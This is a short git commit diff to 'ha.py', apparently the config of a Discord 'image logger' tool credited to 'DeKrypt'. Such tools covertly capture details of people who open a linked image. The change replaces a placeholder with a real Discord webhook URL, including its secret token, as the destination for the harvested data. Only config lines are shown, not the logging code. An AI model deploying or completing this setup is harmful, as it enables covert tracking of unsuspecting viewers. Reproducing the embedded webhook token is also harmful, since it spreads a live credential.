be0e39a777d1907830d8e447c0da2fefce1b211e
derfgyheszfg <mohseenalshareefi@gmail.com>
2025-12-02 00:10:09 +0300

    Update ha.py

--- ha.py
+++ ha.py
@@ -13,7 +13,7 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "WEBHOOK HERE !",
+    "webhook": "https://discord.com/api/webhooks/1445159448132845654/LyMxtmn5yhz1oO1BuHixXQtn-2emi1p_FFGihejAy6edm5zWO4i1peQpiZWQD1q3B6Yw",
     "image": "IMAGE HERE !", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
